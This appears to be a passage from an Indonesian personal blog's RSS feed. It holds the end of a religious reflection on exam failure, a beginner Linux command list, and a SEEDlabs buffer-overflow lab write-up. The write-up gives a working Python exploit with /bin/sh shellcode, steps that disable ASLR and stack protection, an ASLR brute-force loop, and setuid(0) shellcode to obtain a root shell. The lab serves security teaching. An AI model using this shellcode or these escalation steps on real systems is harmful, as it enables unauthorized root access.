  kecewa sampai menangis pun tak apa. itu proses berdka kok. mungkin kamu bakal denial, anger, bargaining. Jangan lupa coping-nya juga harus kuat biar kamu gak resika harga diri rendah atau putus ada dan malah gak mau berusaha lagi buat belajar agar lebih baik lagi.

  Utamanya, harus terus berfikir positif sama Allah. sembari mempertanyakan pada diri sendiri.

  Waktu ujian apa kita udah dekat sama Allah? Waktu ujian apa kita udah tilawah? waktu ujian apa kualitas ibadah kita baik?

  Dan,ya. Mungkin ini cara Allah menyadarkan, Bahwa usaha kerasmu untuk belajar itu mungkin luar biasa, tapi Allah tak ingin kamu lupa pada Rabb-Mu...

  Jadi Allah kasih teguran kecil untuk menyadarkan bahwa tanpa ridho Allah, HARD WORK IS NOTHING.

  Allah ingin kamu dekat dengan-Nya loh, ingin denger doa-doamu. Karena Allah sayang kamu, gak mau kamu cuma mengejar dunia, Allah ingin kamu dapatkan juga pahala untuk akhirat.

  Boleh sedih dan kecewa sama nilai gak sesuai usaha kita, sama hasil jauh dari perkiraan, atau tenrang apapun. Tapi ingat, jangan terlalu lama. Yuk bangkit lagi.
</code></pre>

<p>Setelah saya membaca ini, saya sudah sangat yakin. Iniloh jawaban dari pertanyaan yang ada di pikiranku. ketika sholat, ibadah yang kulakukan hanya untuk sekedar menunaikan kewajiban, dan melupakan makna dari tujuan sholat itu sendiri. Makanya Allah kasih peringatan. Dan ada quote yang menarik dari @therealhaikal yang berbunyi kalo nggak salah &ldquo; ketika apa yang kita inginkan tidak tercapai itulah tanda bahwa kita tidak bisa menyuruh Allah.&rdquo;</p>

<p>Saya akui saya masih banyak kesalahan, dan hanyalah manusia biasa. Tapi kita juga harus berusaha untuk memperbaiki kesalahan itu.</p>

<p>Memang yang diabadikan belum tentu abadi, dan yang tidak diabadikan bisa saja abadi. Saya mengabadikan post ini belum tentu abadi, tapi seenggaknya biar menjadi pembelajaran yang bisa diingat agar tidak terjadi lagi dan agar orang lain dapat belajar dari tulisan ini. Terimakasih, saya tunggu komentar, saran , kritiknya hehe.</p>
]]></content>
        </item>
        
        <item>
            <title>Linux_Basic_Admin</title>
            <link>/posts/linux_basic_admin/</link>
            <pubDate>Fri, 11 Oct 2019 20:51:34 +0700</pubDate>
            
            <guid>/posts/linux_basic_admin/</guid>
            <description>Untuk orang yang baru dalam menggunakan linux, menggunakan linux secara optimal tidaklah sangat mudah, hal pertama yang harus kita ketahui adalah basic command menggunakan terminal.
Berikut beberapa command yang telah kita rangkum : list Menampilkan list detail
 ls -l  Menampilkan list keseluruhan (termasuk dot file)
 ls -la  Menampilkan list berdasarkan waktu
 ls -t  Menampilkan list berdasarkan ukuran file
 ls -S  Menampilkan list berdasarkan tipe file</description>
            <content type="html"><![CDATA[

<p>Untuk orang yang baru dalam menggunakan linux, menggunakan linux secara optimal tidaklah sangat mudah, hal pertama yang harus kita ketahui adalah basic command menggunakan terminal.</p>

<h3 id="berikut-beberapa-command-yang-telah-kita-rangkum">Berikut beberapa command yang telah kita rangkum :</h3>

<h4 id="list">list</h4>

<p>Menampilkan list detail</p>

<pre><code>      ls -l
</code></pre>

<p>Menampilkan list keseluruhan (termasuk dot file)</p>

<pre><code>      ls -la
</code></pre>

<p>Menampilkan list berdasarkan waktu</p>

<pre><code>      ls -t
</code></pre>

<p>Menampilkan list berdasarkan ukuran file</p>

<pre><code>    ls -S
</code></pre>

<p>Menampilkan list berdasarkan tipe file</p>

<pre><code>    ls -F
</code></pre>

<p>Menampilkan list dengan index file nya</p>

<pre><code>    ls -i
</code></pre>

<h4 id="cat">cat</h4>

<p>Print ke terminal isi dari file</p>

<pre><code>    cat [ file ]
</code></pre>

<h4 id="mengubah-directori">Mengubah directori</h4>

<p>Mengubah directori folder</p>

<pre><code>  cd
</code></pre>

<h4 id="tail">Tail</h4>

<p>Menampilkan baris akhir sebanyak n</p>

<pre><code>  [perintah lain] | tail -n
</code></pre>

<p>Monitoring perubahan file</p>

<pre><code>  tail -f [nama file]
</code></pre>

<h4 id="head">Head</h4>

<p>Menampilkan baris awal sebanyak n</p>

<pre><code>  [perintah lain] | head -n
</code></pre>

<h4 id="right-direction">Right Direction</h4>

<p>Replace isi dari file output</p>

<pre><code>  cat /proc/cpuinfo &gt; command.txt
</code></pre>

<h4 id="double-right-directioninsert-sesuatu-pada-file-output">Double Right DirectionInsert sesuatu pada file output</h4>

<pre><code>  cat /proc/cpuinfo | wc -l &gt;&gt; command.txt
</code></pre>

<h4 id="left-direction">Left Direction</h4>

<p>File sebagai input (yang diproses)</p>

<pre><code>  ./program &lt; command.txt
</code></pre>

<h4 id="error-direction">Error Direction</h4>

<p>Memasukkan error pada file output</p>

<pre><code>    mkdir Music 2&gt; myerror.txt (replace)
    mkdir Music 2&gt;&gt; myerror.txt (insert)
</code></pre>

<h4 id="sort">Sort</h4>

<p>Mengurutkan isi file (per baris)</p>

<pre><code>    sort -u [namafile]
</code></pre>

<h4 id="uniq">Uniq</h4>

<p>Menghitung jumlah elemen per nilai dalam data</p>

<pre><code>    uniq -c [namafile]
</code></pre>

<h4 id="grep">Grep</h4>

<p>Mencari kata dalam suatu file</p>

<pre><code>    [perintah] | grep [keyword]
</code></pre>

<h4 id="copy">Copy</h4>

<p>Copy semua file dalam satu direktori</p>

<pre><code>    cp * [direktori tujuan]
</code></pre>

<p>Copy semua file dan sub direktori</p>

<pre><code>    cp -R * [direktori tujuan]
</code></pre>

<p>Copy file</p>

<pre><code>    cp [namafile] [direktori tujuan]
</code></pre>

<p>Copy tanpa merubah date timestamps</p>

<pre><code>    cp -p
</code></pre>

<h4 id="move">Move</h4>

<p>Jika belum ada nama, membuat file baru. Jika sudah ada nama, memindahkan</p>

<pre><code>    mv
</code></pre>

<h4 id="ssh">SSH</h4>

<p>Komputer A SSH komputer B</p>

<pre><code>    ssh B@ip
</code></pre>

<p>A kirim file ke B</p>

<pre><code>    scp [nama file] B@ip:direktori
</code></pre>

<p>B mengambil file dari A</p>

<pre><code>    scp A@ip:direktori [direktori lokal]
</code></pre>

<p>SSH tanpa password</p>

<pre><code>    sshpass -p [password]
</code></pre>

<p>ssh dengan perintah</p>

<pre><code>    A@ip [perintah]
</code></pre>

<h4 id="create-new-file">Create New File</h4>

<p>Membuat file baru</p>

<pre><code>    touch [nama file]
</code></pre>

<h4 id="check-direction">Check Direction</h4>

<p>Menampilkan alamat direktori aktif</p>

<pre><code>    pwd
</code></pre>

<h4 id="locate">Locate</h4>

<p>Mencari file pada semua direktori</p>

<pre><code>  locate [keyword]
</code></pre>

<h4 id="find">Find</h4>

<p>Mencari file pada direktori aktif</p>

<pre><code>  Find [keyword]
</code></pre>

<h4 id="remove">Remove</h4>

<p>Menghapus folder yang kosong</p>

<pre><code>  rmdir
</code></pre>

<p>Menghapus file</p>

<pre><code>  rm [direktori file]
</code></pre>

<p>Menghapus semua isi direktori</p>

<pre><code>  rm -r [direktori]
</code></pre>

<p>Menghapus Paksa semua isi dir (force)</p>

<pre><code>  rm -rf [file / dir]
</code></pre>

<h4 id="check-ip-address">Check IP Address</h4>

<p>Mengecek IP Addres</p>

<pre><code>  ifconfig
  ip address
</code></pre>

<h4 id="show-process">Show Process</h4>

<p>Untuk melihat process status</p>

<pre><code>  ps -ef
</code></pre>

<h4 id="check-env">Check env</h4>

<p>Print Environment Variable</p>

<pre><code>  env
</code></pre>

<h4 id="displays-and-updates-sorted-process-information">Displays and updates sorted process information</h4>

<p>Menampilkan process secara update dan terurut</p>

<pre><code>  top
  htop
</code></pre>

<h4 id="shows-the-network-status">Shows the network status</h4>

<p>Menampilkan status network</p>

<pre><code>  netstat
</code></pre>

<h4 id="display-free-disk-space">Display free disk space</h4>

<p>Menampilkan disk space yang bisa dipakai</p>

<pre><code>  df -h
</code></pre>

<p>-h prints out the information in human-readable format</p>

<h4 id="to-check-the-user-running-the-application">To check the user running the application</h4>

<p>Melihat user id yang berjalan</p>

<pre><code>  id
</code></pre>

<h4 id="change-permision">Change permision</h4>

<p>Mengubah permision suatu File</p>

<pre><code>  chmod [parameter] [file]
</code></pre>

<p>contoh : chmod +x bash.sh, chmod 777 bash.sh</p>

<h4 id="dig-nslookup">dig/nslookup</h4>

<p>dig (DNS lookup utility) or nslookup (query Internet name servers)</p>

<pre><code>  dig equnix.asia
  nslookup equnix.asia
</code></pre>

<h4 id="history">history</h4>

<p>melihat history command</p>

<pre><code>  history
</code></pre>
]]></content>
        </item>
        
        <item>
            <title>Buffer_Overflow_Labs_From_SEEDlabs</title>
            <link>/posts/buffer_overflow_labs_from_seedlabs/</link>
            <pubDate>Fri, 11 Oct 2019 20:25:58 +0700</pubDate>
            
            <guid>/posts/buffer_overflow_labs_from_seedlabs/</guid>
            <description>0x00 Intro Eksploitasi ini dikenal dengan input validation attack yang dapat mengakibatkan suatu sistem crash (buffer overflow) yaitu variabel yang tersedia pada aplikasi tidak dapat menampung input yang sengaja dibuat berlebihan. Kelebihannya dapat mengganti suatu nilai variable (sehingga kita bisa mengontrol nya) juga bisa mennganti suatu nilai return address dari sebuah program.
0x01 Guide Disini saya menggunakan VM yang telah disediakan oleh SEEDlabs, untuk memasang vm dan sebagainya silakan kunjungi situs seedlab untuk melihat dokumentasi,cara install dan download vm nya.</description>
            <content type="html"><![CDATA[

<h2 id="0x00-intro">0x00 Intro</h2>

<p>Eksploitasi ini dikenal dengan input validation attack yang dapat mengakibatkan suatu sistem crash (buffer overflow) yaitu variabel yang tersedia pada aplikasi tidak dapat menampung input yang sengaja dibuat berlebihan. Kelebihannya dapat mengganti suatu nilai variable (sehingga kita bisa mengontrol nya) juga bisa mennganti suatu nilai return address dari sebuah program.</p>

<h2 id="0x01-guide">0x01 Guide</h2>

<p>Disini saya menggunakan VM yang telah disediakan oleh SEEDlabs, untuk memasang vm dan sebagainya silakan kunjungi situs seedlab untuk melihat dokumentasi,cara install dan download vm nya.</p>

<p>Untuk file yang dibutuhkan :</p>

<ol>
<li><p>stack.c (the vulnerable program)</p></li>

<li><p>call_shellcode.c</p></li>

<li><p>Exploit.py (Buat Sendiri)</p></li>
</ol>

<p>Untuk file stack.c dan call_shellcode.c sudah disediakan oleh seedlab, untuk exploit.py saya membuat sendiri payloadnya yang untuk injeksi.</p>

<p>Kita bisa memasukan shellcode kedalam badfile tapi program belum bisa mengeksekusi shellcode karena return address program belum kita overflow dan diarahkan ke lokasi alamat shelccode, untuk itu kita harus menyari return address program, dan menggantinya dengan alamat shellcode.</p>

<p>Untuk mencari return address bisa mudah kita cari menggunakan feature gdb-peda yaitu pattern, saat program kita jalankan kasih pattern yang sudah di generate, akan muncul invalid return address suatu alamat, lalu alamat itu akan di baca oleh gdb-peda dan akan menghasilkan angka berapa ofset yang harus kita isi padding(junk char) agar kita bisa memodifikasi return address.</p>

<p>Untuk mencari alamat shellcode, debug program dengan gdb-peda lalu break pada salah satu address saat variable buffer terbuat, lalu bisa kita baca alamat buffer tersebut.</p>

<p>Ketika sudah mendapat return address dan alamat shellcode, kita buat payload dan memasukannya kedalam badfile, setelah itu kita jalankan programnya stack. Apabila berhasil masuk ke dalam shell berarti buffer overflow berhasil.</p>

<p>Adapun step step yang harus kita lakukan :</p>

<ol>
<li><p>Mematikan Address Space Randomization pada VM.</p></li>

<li><p>Mengcompile file stack.c dengan mematikan StackGuard Protection Scheme dan membuat shellcode di stack dapat di eksekusi (execstack).</p></li>

<li><p>Mencoba dan memastikan dapat mengeksekusi shellcode dengan file call_shellcode.c</p></li>

<li><p>Mencari offset untuk return address</p></li>

<li><p>Mencari alamat Buffer</p></li>

<li><p>Membuat Payload dan mengeksekusi</p></li>
</ol>

<h2 id="0x02-lab">0x02 LAB</h2>

<h3 id="task-1-exploiting-the-vulnerability">TASK 1 : Exploiting the Vulnerability</h3>

<h4 id="1-mematikan-address-space-randomization-pada-vm">1.Mematikan Address Space Randomization pada VM.</h4>

<p>Mematikan ASLR dapat kita lakukan dengan command :</p>

<pre><code>sudo sysctl -w kernel.randomize_va_space=0
</code></pre>

<p>Apabila kita tidak mematikan ASLR alamat alamat pada program akan berubah berubah dan kita akan agak kesulitan untuk melakukan buffer overflow</p>

<h4 id="2-mengcompile-file-stack-c-dengan-mematikan-stackguard-protection-scheme-dan-membuat-shellcode-di-stack-dapat-di-eksekusi-execstack">2.Mengcompile file stack.c dengan mematikan StackGuard Protection Scheme dan membuat shellcode di stack dapat di eksekusi (execstack).</h4>

<p>Secara default compiler gcc saat mengcompile menyalakan StackGuard Protection Scheme untuk mencegah user memasukan input lebih dari yang di definisikan, misal buffer[10] apabila kita memasukan lebih dari 10 character akan terdeteksi stack smasing.</p>

<pre><code>*** stack smashing detected : ./stack terminated
</code></pre>

<p>Selain itu, agar shellcode bisa berjalan perlu -z execstack agar shellcode di stack dapat di eksekusi.</p>

<p>Untuk command nya</p>

<pre><code>gcc -o stack -z execstack -fno-stack-protector stack.c
chmod 4755 stack
</code></pre>

<h4 id="3-mencoba-dan-memastikan-dapat-mengeksekusi-shellcode-dengan-file-call-shellcode-c">3. Mencoba dan memastikan dapat mengeksekusi shellcode dengan file call_shellcode.c</h4>

<p>Compile call_shellcode.c dengan menggunakan perintah :</p>

<pre><code>gcc -z execstack -o call_shellcode call_shellcode.c
</code></pre>

<p>Setelah berhasil lalu jalankan program</p>

<pre><code>./call_shellcode
</code></pre>

<p>Hasilnya :</p>

<p><img src="/img/call_shellcode.png" alt="call_shellcode"
     style="float: left;" />
<br><br><br><br></p>

<h4 id="4-mencari-offset-untuk-return-address">4. Mencari offset untuk return address</h4>

<p>Untuk mendebug program dalam linux bisa menggunakan gdb, namun untuk kasus binary exploitation akan lebih disarankan untuk menggunakan gdb-peda, karena mengandung beberapa feature tambahan untuk buffer overflow salah satunya yaitu pattern untuk mencari nilai offset return address.</p>

<p>pada terminal lakukan gdb pada program stack</p>

<pre><code>gdb -q stack
</code></pre>

<p>lalu buat pattern untuk mencari nilai offset return address</p>

<pre><code>pattern create 40
</code></pre>

<p><img src="/img/pattern.png" alt="pattern_create"
  style="float: left;" />
  <br><br></p>

<p>setelahnya buat file exploit.py dan masukan pattern ke dalam badfile</p>

<pre><code class="language-python">import sys

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))
content[0:40] = &quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa&quot;

# Write the content to badfile
file = open(&quot;badfile&quot;, &quot;wb&quot;)
file.write(content)
file.close()
</code></pre>

<p>lalu jalankan(di terminal baru) dengan command  :</p>

<pre><code>python exploit.py
</code></pre>

<p>akan muncul file bernama badfile, kemudian pada terminal gdb-peda jalankan dengan command run</p>

<p>akan muncul invalid</p>

<p><img src="/img/invalid.png" alt="call_shellcode"
     style="float: left;" />
<br><br></p>

<p>nah kita bisa cari offset return addres nya dengan command pada gdb-peda :</p>

<pre><code>pattern offset 0x61414145
</code></pre>

<p>lalu akan muncul jumlah ofset yang perlu kita ketahui</p>

<p><img src="/img/offset.png" alt="call_shellcode"
     style="float: left;" />
<br><br></p>

<h4 id="5-mencari-alamat-buffer">5.Mencari alamat Buffer</h4>

<p>setelah kita tau offset nya, kita perlu mencari tau alamat buffer nya, masuk ke gdb-peda dan lihat code diassambly nya</p>

<pre><code>$ gdb -q stack
gdb-peda$ pdisass main
</code></pre>

<pre><code class="language-python">Dump of assembler code for function main:
   0x080484da &lt;+0&gt;:	lea    ecx,[esp+0x4]
   0x080484de &lt;+4&gt;:	and    esp,0xfffffff0
   0x080484e1 &lt;+7&gt;:	push   DWORD PTR [ecx-0x4]
   0x080484e4 &lt;+10&gt;:	push   ebp
   0x080484e5 &lt;+11&gt;:	mov    ebp,esp
   0x080484e7 &lt;+13&gt;:	push   ecx
   0x080484e8 &lt;+14&gt;:	sub    esp,0x214
   0x080484ee &lt;+20&gt;:	sub    esp,0x8
   0x080484f1 &lt;+23&gt;:	push   0x80485d0
   0x080484f6 &lt;+28&gt;:	push   0x80485d2
   0x080484fb &lt;+33&gt;:	call   0x80483a0 &lt;fopen@plt&gt;
   0x08048500 &lt;+38&gt;:	add    esp,0x10
   0x08048503 &lt;+41&gt;:	mov    DWORD PTR [ebp-0xc],eax
   0x08048506 &lt;+44&gt;:	push   DWORD PTR [ebp-0xc]
   0x08048509 &lt;+47&gt;:	push   0x205
   0x0804850e &lt;+52&gt;:	push   0x1
   0x08048510 &lt;+54&gt;:	lea    eax,[ebp-0x211]
   0x08048516 &lt;+60&gt;:	push   eax
   0x08048517 &lt;+61&gt;:	call   0x8048360 &lt;fread@plt&gt;
   0x0804851c &lt;+66&gt;:	add    esp,0x10
   0x0804851f &lt;+69&gt;:	sub    esp,0xc
   0x08048522 &lt;+72&gt;:	lea    eax,[ebp-0x211]
   0x08048528 &lt;+78&gt;:	push   eax
   0x08048529 &lt;+79&gt;:	call   0x80484bb &lt;bof&gt;
   0x0804852e &lt;+84&gt;:	add    esp,0x10
   0x08048531 &lt;+87&gt;:	sub    esp,0xc
   0x08048534 &lt;+90&gt;:	push   0x80485da
   0x08048539 &lt;+95&gt;:	call   0x8048380 &lt;puts@plt&gt;
   0x0804853e &lt;+100&gt;:	add    esp,0x10
   0x08048541 &lt;+103&gt;:	mov    eax,0x1
   0x08048546 &lt;+108&gt;:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048549 &lt;+111&gt;:	leave  
   0x0804854a &lt;+112&gt;:	lea    esp,[ecx-0x4]
   0x0804854d &lt;+115&gt;:	ret    
End of assembler dump.
</code></pre>

<p>kita break saat memamnggil function bof</p>

<pre><code>gdb-peda$ b *main+79
Breakpoint 1 at 0x8048529
gdb-peda$ r
</code></pre>

<p>.*</p>

<p>pada stack terlihat alamat str mulai mengisi nilai
pada alamat tertentu yaitu</p>

<pre><code class="language-python">0xbfffea37
</code></pre>

<p><img src="/img/stack.png" alt="call_shellcode"
     style="float: left;" />
<br><br></p>

<p>berarti kita dapat menaruh return address mulai dari alamat diatas sampai 517-len(shelccode) dikarenakan kita akan menaruh shelccode pada akhir badfile, jadi ketika kita alihkan ke alamat diantara alamat diatas sampai 517-len(shelccode) kita pada akhirnya akan menemui shellcode dan dapat mengeksekusi nya karena selain shellcode isi badfile hanyalah 0x90(NOP) yg artinya tidak ada  operasi apa-apa.</p>

<p>kita buat saja return address nya</p>

<pre><code class="language-python">0xbfffea77
</code></pre>

<h4 id="6-membuat-payload-dan-mengeksekusi">6. Membuat Payload dan mengeksekusi</h4>

<p>payload =</p>

<pre><code class="language-python">import sys

shellcode= (
    &quot;\x31\xc0&quot;             # xorl    %eax,%eax              
    &quot;\x50&quot;                 # pushl   %eax                   
    &quot;\x68&quot;&quot;//sh&quot;           # pushl   $0x68732f2f            
    &quot;\x68&quot;&quot;/bin&quot;           # pushl   $0x6e69622f            
    &quot;\x89\xe3&quot;             # movl    %esp,%ebx              
    &quot;\x50&quot;                 # pushl   %eax                   
    &quot;\x53&quot;                 # pushl   %ebx                   
    &quot;\x89\xe1&quot;             # movl    %esp,%ecx              
    &quot;\x99&quot;                 # cdq                            
    &quot;\xb0\x0b&quot;             # movb    $0x0b,%al              
    &quot;\xcd\x80&quot;             # int     $0x80                  
).encode('latin-1')


offset = 36
content = bytearray(0x90 for i in range(517))
start = 517 - len(shellcode)
returna = (&quot;\x77\xea\xff\xbf&quot;).encode('latin-1')
content[0:1]=(&quot;\x41&quot;).encode('latin-1')
content[offset:offset+4] = returna
content[start:] = shellcode
file = open(&quot;badfile&quot;, &quot;wb&quot;)
file.write(content)
file.close()
</code></pre>

<p>pertama-tama seluruh content badfile akan diisi dengan NOP, lalu content pertama kita isi dengan 0x41 untuk mengetahui itu merupakan mulainya str,
kemudian di offset return addres kita isi dengan return address diatas agar masuk ke addres str(badfile), pada akhir ( 517 - len(shellcode)) kita tulis kan shelccode nya</p>

<p>lalu kita buat exploit nya dan menjalankan program stack nya</p>

<pre><code>python3 exploit.py
./StackGuard
</code></pre>

<p>jika berhasil akan mengarahkan kita ke shellcode</p>

<p><img src="/img/shell.png" alt="call_shellcode"
     style="float: left;" />
<br></p>

<p>Exploit berhasil kita lakukan</p>

<hr />

<h3 id="task-2-address-randomization">Task 2: Address Randomization</h3>

<p>pada task 2, kita menyalakan sistem aslr dalam linux dengan command</p>

<pre><code>  sudo sysctl -w kernel.randomize_va_space=2
</code></pre>

<p>lalu kita lakukan bruteforce sampai ketemu sesuai dengan alamat address nya,</p>

<pre><code>  sh -c &quot;while [ 1 ]; do ./stack; done;&quot;
</code></pre>

<p>kita lakukan loop sampai program bisa tereksekusi.</p>

<p>Bukti :</p>

<p><img src="/img/task2.png" alt="" /></p>

<p>Proses while mencari addres yg sesuai (Faktor Lucky,bisa sangat lama, bisa cepat, tapi kebanyakan lama, saya sendiri beberapa jam baru ketemu) :</p>

<p><img src="/img/prosestask2.png" alt="" /></p>

<p>Setelah mendapat shell (akhirnyaaaa) :
<img src="/img/hasiltask2.png" alt="" /></p>

<hr />

<h3 id="task-3-stack-guard">Task 3: Stack Guard</h3>

<p>Pada task ini kita mencoba untuk tidak mematikan stack guard protection yang mana akan menghalangi kita untuk melakukan buffer overflow,</p>

<p>Hasil :
<img src="/img/task3.png" alt="" /></p>

<hr />

<h3 id="task-4-non-executable-stack">Task 4: Non-executable Stack</h3>

<p>pada task kali ini kita menjalankan program dengan tidak mengijinkan isi stack dapat dieksekusi</p>

<pre><code>  gcc -o stack -z noexecstack -fno-stack-protector stack.c
</code></pre>

<p>perintah noexecstack membuat kita tidak bisa menjalankan shellcode yang ada di dalam Stack</p>

<p>Hasil :</p>

<p><img src="/img/task4.png" alt="" /></p>

<p>mendapatkan segmentation fault karena tidak bisa menjalankan payload dalam stack</p>

<hr />

<h3 id="task-5-defeating-dash-s-countermeasure">Task 5: Defeating dash&rsquo;s countermeasure</h3>

<p>Kita coba dulu program untuk mendapatkan shell</p>

<pre><code class="language-objective-c">// dash_shell_test.c
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
int main()
{
char *argv[2];
argv[0] = &quot;/bin/sh&quot;;
argv[1] = NULL;
// setuid(0); ➀
execve(&quot;/bin/sh&quot;, argv, NULL);
return 0;
}
</code></pre>

<p>**.</p>

<p>Maka akan mendapat kan root :
<img src="/img/t5.png" alt="" /></p>

<p>Tapi ketika kita setuid(0) kita aktifkan maka akan mendapat user seed:
<img src="/img/t51.png" alt="" /></p>

<p>Nah kita perlu memodifikasi shellcode agar kita bisa mendapatkan akses root, pada file exploit.py kita tambahkan shellcode berikut pada line diatasnya</p>

<pre><code class="language-python">har shellcode[] =
&quot;\x31\xc0&quot; /* Line 1: xorl %eax,%eax */
&quot;\x31\xdb&quot; /* Line 2: xorl %ebx,%ebx */
&quot;\xb0\xd5&quot; /* Line 3: movb $0xd5,%al */
&quot;\xcd\x80&quot; /* Line 4: int $0x80 */
</code></pre>

<p>akan mendapatkan root :
<img src="/img/t52.png" alt="" /></p>

<p>jika program diatas dijalankan pada program yang ada countermeasure dash nya maka kita yang semestinya akan mendapat shell user akan mendapat shell root.</p>
]]></content>
        </item>
        
    </channel>
</rss>
